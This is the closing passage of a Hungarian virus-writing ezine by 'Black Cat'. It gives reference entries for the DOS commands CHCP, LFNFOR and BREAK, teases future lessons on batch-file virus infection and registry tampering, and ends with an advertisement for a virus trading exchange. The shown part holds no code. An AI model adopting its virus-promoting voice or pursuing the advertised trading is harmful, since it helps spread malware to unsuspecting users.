      fájlt (helyettesítõ karakterek vagy a fájl1+fájl2+fájl3 alak
      használatával).
      CHCPAz aktív kódlap számának megjelenítése vagy beállítása

      CHCP [nnn]

      nnn A kódlapszám megadása

      A CHCP paraméter nélküli beírásakor az aktív kódlapszám kerül kiírásra.
      LFNFORHosszú fájlneveket engedélyez vagy tilt FOR parancsok
      feldolgozásakor.

      LFNFOR [ON | OFF]

      Az aktuális beállítás megjelenítéséhez írd be az LFNFOR parancsot
      paraméterek nélkül.
      BREAKA kiterjesztett CTRL+C ellenõrzés beállítása vagy törlése.

      BREAK [ON | OFF]

      A BREAK aktuális beállításának megjelenítéséhez írd be paraméter nélkül a
      BREAK parancsot.






MÁRA ENNYI...
Ha kíváncsiak vagytok a folytatásra, a következ&otilde; ezine-ben újabb fert&otilde;zési
technikákkal ismerkedhettek meg. Megtanulhatjátok továbbá a WIN32-es BAT vírusok
mûködését, a regisztrációs adatbázis matatását BAT-ból, és beleszagolunk egy
kicsit az id&otilde;zítésbe. Illetve  megtanuljuk, hogyan írhatunk valóban profi, már
nem tisztán BAT vírust, mely már olyan tulajdonságokkal rendelkezik, mint egy
DOS-os vírus, vagyis DOS-os vírusok implementálása BAT-ba. (A következõ lesz a
legjobb rész.) És természetesen újabb parancsokat is megismerhettek. Profik
leszünk a végére gyerekek, nekem elhihetitek... Kérés kérdés, panasz, óhaj,
sóhaj, a sajátkészítésû virii-k, meg bármi miatt írjatok a postámba. A címem ITT
található.





Készítette : Black Cat

BCAT_H@YAHOO.COM            HTTP://JUMP.TO/BCVES
The Black Cat Virus Exchange System
More than 25000 virii for trading.

He is a virus trader/writer and member of the FCF (Formater's Cracking Force).
The FCF can be reached via http://jump.to/fcf
Interested in further developments and updates? Visit the Black Cat Virus Exchange System!
Black Cat's logs can d/led via: http://bcves.jump.to/bclogs.rar
Black Cat's trading page can be found: http://bcves.jump.to/trading.htm

The Virus Sorter New Generation COMPLETE PACKAGE can be downloaded via: http://bcves.jump.to/vsng.rar
The package contains the complete HELP and any additional files. (pictures, url shortcuts, etc.) Size: 140K
The Virus Sorter New Generation SIMPLE PACK can be downloaded via: http://bcves.jump.to/vsng.exe
D/L, and GO! Nothing to do with it! (not recommended for 1st time users) Size: 60K_
Would u like to trade? What are you waiting for?
The Black Cat Virus Exchange System provides a powerfull, and completely free home of trading, and traders. Would u like to be a member? Would u like a trading page at BCVES? Would you like to meet other 
traders? Would you like yourself to be distributed with this (vsng complete) package? In the URLS subdirectory all BCVES members' BCVES URL can be found as W9X Internet shortcut icons._
First, subscribe to the Black Cat Virus Exchange System's egroup (bcves-subscribe@egroups.com)
Than send a letter to Black Cat, with the following information:
- Name (nickname)
- A short message (optional)
- The place (URL) of your logs
- The place (URL) of your log statistics
- The place (URL) of your PGP key (optional)
- Your email address
And that's all. After some day, you'll be up. Why to choose BCVES? More than 150 visitors a week. :)
Do you need privacy? D/l the BCVES's PGP key (http://bcves.jump.to/bcves.asc)
Would you like to use PGP when writing to Black Cat? PGP can be found here (http://bcves.jump.to/blackcat.asc)!_
HAPPY TRADING!!